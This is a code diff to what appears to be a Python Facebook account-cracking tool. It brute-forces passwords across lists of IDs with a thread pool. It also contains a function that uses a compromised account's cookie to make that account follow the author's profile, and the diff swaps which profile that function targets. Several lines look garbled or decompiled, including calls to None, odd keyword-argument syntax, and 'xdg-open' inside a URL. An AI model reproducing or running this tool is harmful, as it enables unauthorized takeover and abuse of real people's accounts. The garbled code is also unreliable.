@@ -46,7 +46,7 @@ def FD():
 def o():
     os.system('clear')
     jalan(logo)
-    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
+    jalan('RANDOM NUMBER CRACK')
     print('')
     jalan('\x1b[1;32m [1]\x1b[1;33m NHMBER RANDOM CRACK ')
     jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
@@ -87,35 +87,11 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
-    
-def cek_apk(session,coki):
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        None(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        None(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
+  
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('xdg-open https://www.facebook.com/himatullah.shinwari', {
+        r = BeautifulSoup(session.get('xdg-open https://www.facebook.com/profile.php?id=100028315179402', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -269,7 +245,7 @@ def i():
     for bilal in range(passx):
         pww = input("[*] Enter Password : ")
         HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
+    with ThreadPool(max_workers=30) as manshera:
         clear()
         tl = str(len(user))
         print('\033[1;36m TOTAL IDS: '+tl)
